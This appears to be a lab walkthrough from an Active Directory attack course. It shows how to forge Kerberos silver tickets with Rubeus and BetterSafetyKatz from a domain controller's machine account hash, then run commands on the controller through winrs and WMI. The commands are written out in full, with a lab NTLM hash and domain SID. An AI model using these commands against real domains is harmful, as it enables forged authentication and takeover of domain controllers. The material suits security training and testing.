# 🎫 Command execution on other DC via silver ticket on HTTP & WMI

From the information gathered in previous steps we have the hash for machine account of the domain controller (dcorp-dc$). Using the below command, we can create a Silver Ticket that provides us access to the HTTP service of DC

Please note that the hash of dcorp-dc$ (RC4 in the below command) may be different in the lab. You can also use aes256 keys in place of NTLM hash:

In our previous path we had to copy the hash of the machine account of Dcorp-DC. You can identify it as Dcorp-DC$

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption><p>9e81989d7ce17b7bbd3ac1e05dc94e57</p></figcaption></figure>

First we start by encoding "silver" then we throw in rubeus ->

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:9e81989d7ce17b7bbd3ac1e05dc94e57 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

<figure><img src="../../.gitbook/assets/image (1116).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1117).png" alt=""><figcaption></figcaption></figure>

We can check if we go the correct service ticket but first we need to encode "klist":

We can check if we go the correct service ticket:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn%
```

<figure><img src="../../.gitbook/assets/image (1118).png" alt=""><figcaption></figcaption></figure>

And now we can enter the session:

```
winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd    
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

For accessing WMI, we need to create two tickets - one for HOST service and another for RPCSS. We could also use Rubeus for this but let's use BetterSafetyKatz. Note that we are not using any AV bypass technique here as this is just an example:

Let's start an elevated shell:

(don't forget to use hash of machine user)

```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:9e81989d7ce17b7bbd3ac1e05dc94e57 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Now we need to Inject a ticket for RPCSS:

```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:9e81989d7ce17b7bbd3ac1e05dc94e57 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

And if we check what tickets are present with `klist:`

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

And now we could tru to run WMI commands on the domain controller:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
